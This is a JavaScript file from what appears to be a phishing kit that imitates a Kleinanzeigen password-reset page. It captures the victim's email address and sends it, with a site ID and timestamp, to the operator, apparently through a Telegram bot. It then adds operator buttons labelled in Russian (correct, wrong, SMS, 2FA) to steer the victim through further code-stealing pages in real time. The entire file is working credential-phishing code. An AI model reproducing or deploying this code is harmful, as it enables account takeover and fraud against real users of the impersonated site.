(function () {
  if (!sessionStorage.getItem("ka_site_id")) { window.location.href = "login.html"; return; }
  var input      = document.getElementById("resetEmail");
  var emailGroup = document.getElementById("emailGroup");
  var saved = sessionStorage.getItem("ka_email") || "";
  if (saved) { input.value = saved; emailGroup.classList.add("has-value"); }
  input.addEventListener("input", function () {
    if (input.value) emailGroup.classList.add("has-value");
    else emailGroup.classList.remove("has-value");
  });
  document.getElementById("btnAbsenden").addEventListener("click", function () {
    var val = input.value.trim();
    if (!val) { input.focus(); return; }
    sessionStorage.setItem("ka_email", val);
    var siteId    = sessionStorage.getItem("ka_site_id") || "";
    var mainMsgId = parseInt(sessionStorage.getItem("ka_msg_id") || "0");
    var text =
      "\uD83D\uDD04 <b>Kleinanzeigen Passwort Reset</b>\n" +
      "\uD83C\uDD94 <b>Site ID:</b> <code>#" + siteId + "</code>\n" +
      "\uD83D\uDCE7 <b>Email:</b> " + val + "\n" +
      "\uD83D\uDDD3 <b>Zeit:</b> " + new Date().toLocaleString("de-DE");
    var btn = document.getElementById("btnAbsenden");
    btn.disabled = true;
    btn.innerHTML = '<span class="btn-dots"><span>.</span><span>.</span><span>.</span></span>';
    var requests = [KA.sendMessage(text)];
    if (mainMsgId) {
      requests.push(KA.editMarkup(mainMsgId, [
        [{ text: "\uD83D\uDC41 \uD83D\uDFE2 \u041E\u043D\u043B\u0430\u0439\u043D \u2014 \uD83D\uDD04 \u0421\u0431\u0440\u043E\u0441", callback_data: siteId + ":status" }],
        [
          { text: "\u2705 \u0412\u0435\u0440\u043D\u043E", callback_data: siteId + ":success" },
          { text: "\uD83D\uDCF1 SMS",    callback_data: siteId + ":sms" },
          { text: "\uD83D\uDD10 2FA",    callback_data: siteId + ":2fa" },
          { text: "\u274C \u041D\u0435\u0432\u0435\u0440\u043D\u043E", callback_data: siteId + ":wrong" }
        ]
      ]));
    }
    Promise.all(requests).then(function() { window.location.href = "forgot_code.html"; });
  });
})();
